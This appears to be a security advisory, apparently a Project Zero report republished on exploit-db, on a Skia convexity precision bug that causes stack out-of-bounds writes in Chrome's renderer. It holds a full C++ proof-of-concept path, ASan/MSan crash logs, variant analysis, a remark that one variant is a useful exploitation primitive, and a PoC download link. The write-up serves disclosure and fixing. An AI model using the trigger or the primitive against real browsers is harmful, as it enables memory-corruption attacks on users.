@@ -1,0 +1,225 @@
+I was looking into the root cause of https://bugs.chromium.org/p/chromium/issues/detail?id=850350. In that bug, due to precision errors, Skia generated a concave RRect, but declared it convex. Later, the RRect was transformed with an affine transform and used as a clipping region for drawing. Because the convex path filling algorithm was used while the path was actually concave, this broke some assumptions and led to a stack out-of-bounds write.
+
+The bug was fixed by addressing the precision errors in RRect generation. However, there is another subtle issue:
+
+If Skia ever declares a path convex, the convexity attribute is going to survive affine transforms. Normally, in geometry, transforming a convex path with an affine transform is always going to result in a convex path. However, in Skia, due to precision limitations, that assumption might be incorrect because:
+
+ a) Due to precision errors, Skia may declare a polygon with tiny concavities to be convex. Using an affine transform, the concavities can then be rotated and enlarged.
+ b) It might be possible, that due to precision errors, applying an affine transform on a convex path might result in tiny concavities that can be blown up by subsequent transformations.
+
+There are possible multiple places where using a concave polygon with incorrect convexity attribute might lead to problems. The one I used in the PoC is the same as in https://bugs.chromium.org/p/chromium/issues/detail?id=850350. What happens there is walk_convex_edges() being used on a concave path:
+https://cs.chromium.org/chromium/src/third_party/skia/src/core/SkScan_Path.cpp?l=213&rcl=61c5108108acaeb4ee7fc8cb97c41f4f97d99040
+This leads to breaking another Skia assumption - that the image is always going to be rendered in the top-to-bottom, left-to-right order.
+If the path is used as a clipping region, this leads to incorrect ordering of runs in SkRgnBuilder. When the correspoding SkRgnClipBlitter is used, the "left < right" assumption gets broken here
+https://cs.chromium.org/chromium/src/third_party/skia/src/core/SkBlitter.cpp?l=612&rcl=b2a232fb20358ccd6c7c2fafb7e83e444e4e2458
+which results in calling SkAlphaRuns::Break with the negative "count" argument, which leads to out-of-bounds write here:
+https://cs.chromium.org/chromium/src/third_party/skia/src/core/SkAntiRun.h?g=0&rcl=c640d0dc96924699fdbb1a3cbdc907aa07b1cb3c&l=154
+
+The following Skia program demonstrates the issue:
+
+=================================================================
+
+#include <stdio.h>
+
+#include "SkCanvas.h"
+#include "SkPath.h"
+#include "SkBitmap.h"
+#include "SkRegion.h"
+
+int main(int argc, char * const argv[]) {
+
+  SkBitmap bitmap;
+  bitmap.allocN32Pixels(24, 24);
+  SkCanvas canvas(bitmap);
+
+  SkPaint paint;
+  paint.setAntiAlias(true);
+  paint.setStyle(SkPaint::kFill_Style);
+
+  // This is monotone in both x and y, but has a tiny concavity
+  SkPath path;
+  path.moveTo(-1,-1);
+  path.lineTo(0, 0);
+  path.lineTo(0, 0.5e-10);
+  path.lineTo(0.1e-10, 1.1e-10);
+  path.lineTo(1.5e-10, 1.1e-10);
+  path.lineTo(1.5e-10, 2.5e-10);
+  path.lineTo(0.9, 1);
+  path.lineTo(-1, 1);
+  path.close();
+
+  // If asked, Skia is going to declare it convex
+  if(path.isConvex()) {
+    printf("convex\n");
+  } else {
+    printf("not convex\n");
+  }
+
+  // The convexity flag is going to survive all affine transforms
+  // Even those that will enlarge the concavity and make the path
+  // non-monotone.
+  SkMatrix m;
+  m.setRotate(-45);
+  m.postScale(10e10, 10e10);
+  m.postSkew(-1, 0);
+  m.postTranslate(1, 10);
+  path.transform(m);
+
+  // As demonstrated here
+  if(path.isConvex()) {
+    printf("convex\n");
+  } else {
+    printf("not convex\n");
+  }
+
+  // We'll use the path as a clip region
+  canvas.clipPath(path);
+
+  // And now we'll just draw a simple triangle.
+  SkPath path2;
+  path2.moveTo(15.5, 15);
+  path2.lineTo(50.5, 50);
+  path2.lineTo(-19.5, 50);
+  path2.close();
+  canvas.drawPath(path2, paint);
+
+  printf("done\n");
+
+  return 0;
+}
+
+=================================================================
+
+ASan log:
+
+=================================================================
+==139872==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffc5c8950d4 at pc 0x00000135512e bp 0x7ffc5c894f30 sp 0x7ffc5c894f28
+WRITE of size 1 at 0x7ffc5c8950d4 thread T0
+    #0 0x135512d in SkAlphaRuns::Break(short*, unsigned char*, int, int) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/../../src/core/SkAntiRun.h:154:26
+    #1 0x135512d in SkRgnClipBlitter::blitAntiH(int, int, unsigned char const*, short const*) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/../../src/core/SkBlitter.cpp:615
+    #2 0xac437f in SkBlitter::blitAntiH2(int, int, unsigned int, unsigned int) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/../../src/core/SkBlitter.h:96:15
+    #3 0x1465fa4 in blit_trapezoid_row(AdditiveBlitter*, int, int, int, int, int, int, int, unsigned char, unsigned char*, bool, bool, bool) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/../../src/core/SkScan_AAAPath.cpp
+    #4 0x1465fa4 in aaa_walk_convex_edges(SkAnalyticEdge*, AdditiveBlitter*, int, int, int, int, bool) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/../../src/core/SkScan_AAAPath.cpp:1187
+    #5 0x1465fa4 in aaa_fill_path(SkPath const&, SkIRect const&, AdditiveBlitter*, int, int, bool, bool, bool) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/../../src/core/SkScan_AAAPath.cpp:1669
+    #6 0x1465fa4 in SkScan::AAAFillPath(SkPath const&, SkBlitter*, SkIRect const&, SkIRect const&, bool) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/../../src/core/SkScan_AAAPath.cpp:1713
+    #7 0xad5687 in SkScan::AntiFillPath(SkPath const&, SkRegion const&, SkBlitter*, bool, SkDAARecord*) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/../../src/core/SkScan_AntiPath.cpp:844:9
+    #8 0xad6cf6 in SkScan::AntiFillPath(SkPath const&, SkRasterClip const&, SkBlitter*, SkDAARecord*) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/../../src/core/SkScan_AntiPath.cpp:883:9
+    #9 0x9c5902 in SkDraw::drawDevPath(SkPath const&, SkPaint const&, bool, SkBlitter*, bool) const /usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/../../src/core/SkDraw.cpp:1018:5
+    #10 0x9c64b9 in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool, bool, SkBlitter*) const /usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/../../src/core/SkDraw.cpp:1101:11
+    #11 0x13478f3 in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool) const /usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/../../src/core/SkDraw.h:56:15
+    #12 0x13478f3 in SkBitmapDevice::drawPath(SkPath const&, SkPaint const&, bool) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/../../src/core/SkBitmapDevice.cpp:407
+    #13 0x98e9ce in SkCanvas::onDrawPath(SkPath const&, SkPaint const&) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/../../src/core/SkCanvas.cpp:2141:23
+    #14 0x983f71 in SkCanvas::drawPath(SkPath const&, SkPaint const&) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/../../src/core/SkCanvas.cpp:1694:11
+    #15 0x69add0 in main /usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/../../example/SkiaSDLExample.cpp:63:10
+    #16 0x7ff1044112b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)
+    #17 0x5ab0e9 in _start (/usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/SkiaSDLExample+0x5ab0e9)
+
+Address 0x7ffc5c8950d4 is located in stack of thread T0 at offset 52 in frame
+    #0 0xac421f in SkBlitter::blitAntiH2(int, int, unsigned int, unsigned int) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/../../src/core/SkBlitter.h:87
+
+  This frame has 2 object(s):
+    [32, 38) 'runs'
+    [64, 66) 'aa' <== Memory access at offset 52 underflows this variable
+HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext
+      (longjmp and C++ exceptions *are* supported)
+SUMMARY: AddressSanitizer: stack-buffer-overflow /usr/local/google/home/ifratric/p0/skia/skia20181029/out/asan/../../src/core/SkAntiRun.h:154:26 in SkAlphaRuns::Break(short*, unsigned char*, int, int)
+Shadow bytes around the buggy address:
+  0x10000b90a9c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10000b90a9d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10000b90a9e0: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 00 00 f2
+  0x10000b90a9f0: f2 f2 f2 f2 04 f2 04 f3 00 00 00 00 00 00 00 00
+  0x10000b90aa00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x10000b90aa10: 00 00 00 00 f1 f1 f1 f1 06 f2[f2]f2 02 f3 f3 f3
+  0x10000b90aa20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10000b90aa30: f1 f1 f1 f1 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10000b90aa40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10000b90aa50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10000b90aa60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==139872==ABORTING
+
+################################################################################
+
+Another variant of this issue can be triggered while rendering a concave path with SkScan::SAAFillPath algorithm.
+
+When drawing a path with SkScan::SAAFillPath, if the path is concave but Skia thinks it's convex, this can lead to SuperBlitter::blitH without respecting the the top-to-bottom, left-to-right order. In this case, this leads to SkAlphaRuns::add also being called out-of-order, which leads to SkAlphaRuns::Break being called with a negative "x" argument, which leads to uninitialized memory being read here:
+https://cs.chromium.org/chromium/src/third_party/skia/src/core/SkAntiRun.h?g=0&l=150&rcl=c640d0dc96924699fdbb1a3cbdc907aa07b1cb3c
+Which then leads to out-of-bounds reads/writes on the following lines:
+https://cs.chromium.org/chromium/src/third_party/skia/src/core/SkAntiRun.h?g=0&rcl=c640d0dc96924699fdbb1a3cbdc907aa07b1cb3c&l=154
+https://cs.chromium.org/chromium/src/third_party/skia/src/core/SkAntiRun.h?g=0&rcl=c640d0dc96924699fdbb1a3cbdc907aa07b1cb3c&l=155
+
+This issue is also triggerable in Chrome by simply drawing a path to the canvas.
+
+Skia and Chrome PoCs are attached.
+
+
+MSan log from Skia:
+
+==55058==WARNING: MemorySanitizer: use-of-uninitialized-value
+    #0 0xcb9188 in SkAlphaRuns::Break(short*, unsigned char*, int, int) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkAntiRun.h:155:17
+    #1 0xcb9188 in SkAlphaRuns::add(int, unsigned int, int, unsigned int, unsigned int, int) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkAntiRun.h:83
+    #2 0xcb9188 in SuperBlitter::blitH(int, int, int) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkScan_AntiPath.cpp:251
+    #3 0xce2e0e in walk_convex_edges(SkEdge*, SkPath::FillType, SkBlitter*, int, int, void (*)(SkBlitter*, int, bool)) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkScan_Path.cpp:278:30
+    #4 0xce0b79 in sk_fill_path(SkPath const&, SkIRect const&, SkBlitter*, int, int, int, bool) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkScan_Path.cpp:488:9
+    #5 0xcbc6f3 in SkScan::SAAFillPath(SkPath const&, SkBlitter*, SkIRect const&, SkIRect const&, bool) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkScan_AntiPath.cpp:737:9
+    #6 0xcbe0a2 in SkScan::AntiFillPath(SkPath const&, SkRegion const&, SkBlitter*, bool, SkDAARecord*) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkScan_AntiPath.cpp:852:9
+    #7 0xb02720 in SkDraw::drawDevPath(SkPath const&, SkPaint const&, bool, SkBlitter*, bool) const /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkDraw.cpp:1018:5
+    #8 0xb03efc in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool, bool, SkBlitter*) const /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkDraw.cpp:1101:11
+    #9 0x19efe03 in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool) const /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkDraw.h:56:15
+    #10 0x19efe03 in SkBitmapDevice::drawPath(SkPath const&, SkPaint const&, bool) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkBitmapDevice.cpp:407
+    #11 0xab09cb in SkCanvas::onDrawPath(SkPath const&, SkPaint const&) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkCanvas.cpp:2141:23
+    #12 0xaa0237 in SkCanvas::drawPath(SkPath const&, SkPaint const&) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkCanvas.cpp:1694:11
+    #13 0x62077d in main /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../example/SkiaSDLExample.cpp:52:10
+    #14 0x7f8901e5f2b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)
+    #15 0x5af729 in _start (/usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/SkiaSDLExample+0x5af729)
+
+  Uninitialized value was created by a heap allocation
+    #0 0x5b799c in __interceptor_malloc (/usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/SkiaSDLExample+0x5b799c)
+    #1 0xdb06dd in sk_malloc_flags(unsigned long, unsigned int) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/ports/SkMemory_malloc.cpp:71:13
+    #2 0xb0b9c7 in sk_malloc_throw(unsigned long) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../include/private/SkMalloc.h:59:12
+    #3 0xb0b9c7 in SkAutoMalloc::reset(unsigned long, SkAutoMalloc::OnShrink) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkAutoMalloc.h:53
+    #4 0xb0b9c7 in SkBlitter::allocBlitMemory(unsigned long) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkBlitter.h:137
+    #5 0xcb6c9d in SuperBlitter::SuperBlitter(SkBlitter*, SkIRect const&, SkIRect const&, bool) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkScan_AntiPath.cpp:159:32
+    #6 0xcbc648 in SkScan::SAAFillPath(SkPath const&, SkBlitter*, SkIRect const&, SkIRect const&, bool) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkScan_AntiPath.cpp:736:22
+    #7 0xcbe0a2 in SkScan::AntiFillPath(SkPath const&, SkRegion const&, SkBlitter*, bool, SkDAARecord*) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkScan_AntiPath.cpp:852:9
+    #8 0xb02720 in SkDraw::drawDevPath(SkPath const&, SkPaint const&, bool, SkBlitter*, bool) const /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkDraw.cpp:1018:5
+    #9 0xb03efc in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool, bool, SkBlitter*) const /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkDraw.cpp:1101:11
+    #10 0x19efe03 in SkDraw::drawPath(SkPath const&, SkPaint const&, SkMatrix const*, bool) const /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkDraw.h:56:15
+    #11 0x19efe03 in SkBitmapDevice::drawPath(SkPath const&, SkPaint const&, bool) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkBitmapDevice.cpp:407
+    #12 0xab09cb in SkCanvas::onDrawPath(SkPath const&, SkPaint const&) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkCanvas.cpp:2141:23
+    #13 0xaa0237 in SkCanvas::drawPath(SkPath const&, SkPaint const&) /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../src/core/SkCanvas.cpp:1694:11
+    #14 0x62077d in main /usr/local/google/home/ifratric/p0/skia/skia20181029/out/msan/../../example/SkiaSDLExample.cpp:52:10
+    #15 0x7f8901e5f2b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)
+
+################################################################################
+
+A third variant of this, which is also exploitable in Chrome (I just linked to the ClusterFuzz testcase) is when a path is rendered SkScan::SAAFillPath with a MaskSuperBlitter. In this case, rendering concave path as convex leads to "x" coordinate being increased beyond the image bounds, which leads to incrementing out-of-bounds data in
+https://skia.googlesource.com/skia/+/fa7df23d8b0c4121adfc5ad45c295e7077fad3f5/src/core/SkScan_AntiPath.cpp#483
+
+Note: ptr normally points inside
+https://cs.chromium.org/chromium/src/third_party/skia/src/core/SkScan_AntiPath.cpp?type=cs&g=0&l=435&rcl=05caa69a3f5aa45fd230ec302e6da1522d993747
+which is (in this case) allocated on the stack, so this variant gives us a stack out-of-bounds increment by a chosen small value, which is a pretty nice exploitation primitive.
+
+PoCs for Skia and Chrome are attached.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46332.zip
